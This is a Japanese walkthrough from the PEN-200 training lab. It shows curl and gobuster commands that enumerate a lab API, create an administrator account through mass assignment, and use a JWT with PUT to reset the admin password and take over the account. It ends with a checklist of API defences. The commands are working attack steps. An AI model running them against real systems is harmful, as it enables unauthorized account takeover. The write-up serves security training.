### 具体例(CLI)：PEN-200

存在するAPIを洗い出す。レスポンスに着目する。使用可能なメソッドを探す。

#### 1. APIエンドポイントの発見 (`/users/v1`)

```zsh
curl -i http://192.168.50.16:5002/users/v1
```

目的:

- `/users/v1` にリクエストを送り、ユーザー情報を取得する。
- 取得したデータには `admin` というアカウントが含まれていた。

#### 2. `/users/v1/admin/` に対するディレクトリブルートフォース

```zsh
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```

目的:

- `admin` に関連するAPIエンドポイントが存在するか確認。
- `/email` と `/password` というエンドポイントを発見。

#### 3. `/users/v1/admin/password` のリクエスト

```zsh
curl -i http://192.168.50.16:5002/users/v1/admin/password
```

結果:

- `405 METHOD NOT ALLOWED` → エンドポイントは存在するが、`GET` メソッドは許可されていない。

#### 4. `/users/v1/login` でログインAPIの存在確認

```zsh
curl -i http://192.168.50.16:5002/users/v1/login
```

結果:

- `404 NOT FOUND` だが、レスポンスに `"User not found"` とあるため、API自体は存在する。

#### 5. `POST` でログイン試行 (`admin` ユーザー)

```zsh
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/login
```

結果:

- `"Password is not correct for the given username."` → APIは動作しているが、パスワードが不正。

#### 6. ユーザー登録を試行

```zsh
curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
```

結果:

- `"email is a required property"` → 登録にはemailが必須。

#### 7. `admin=True` を追加して管理者ユーザーを作成

```zsh
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
```

結果:

- 管理者アカウントを作成成功！ (`"Successfully registered."`)

#### 8. 作成アカウント でログインし、JWTトークンを取得

```zsh
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/login
```

結果:

- JWTを取得 (`"auth_token": "eyJ0eXA..."`)

#### 9. `admin` のパスワード変更 (`POST` 試行)

```zsh
curl  \   
'http://192.168.50.16:5002/users/v1/admin/password' \ 
-H 'Content-Type: application/json' \ 
-H 'Authorization: OAuth <取得したJWT>' \ 
-d '{"password": "pwned"}'
```

結果:

- `405 METHOD NOT ALLOWED` → `POST` は使えない
- (Authorizationヘッダは、認証メカニズムとその内容を追記：[Mozilla](https://developer.mozilla.org/ja/docs/Web/HTTP/Reference/Headers/Authorization))

#### 10. `PUT` メソッドでパスワード変更試行

```zsh
curl -X 'PUT' \
'http://192.168.50.16:5002/users/v1/admin/password' \ 
-H 'Content-Type: application/json' \
-H 'Authorization: OAuth <取得したJWT>' \ 
-d '{"password": "pwned"}'
```

結果:

- エラーが出ない → 成功の可能性あり！

#### 11. `admin` で新しいパスワードでログイン試行

```zsh
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/login
```

結果:

- `admin` でログイン成功！ JWTを取得。 → `管理者アカウントの乗っ取り成功！`

## 脆弱なAPI対策

- [ ] 一般に公開しないAPIのドキュメントは秘匿にする
- [ ] 正規のテスターがAPIの攻撃対象領域を完全に把握できるように、ドキュメントを常に最新の状態に保つこと。
- [ ] 許可する HTTP メソッドの ホワイトリストを適用する。
- [ ] リクエストとレスポンスで意図した`Content-Type`であることを検証すること
- [ ] エラーメッセージは情報を開示しないように常に固定すること
- [ ] APIのすべてのバージョンでセキュリティ対策をすること。現在のバージョンだけでなく
- [ ] Mass assignment対策として、ユーザが更新可能なプロパティの許可リストと、更新させないプロパティのリストを作成する
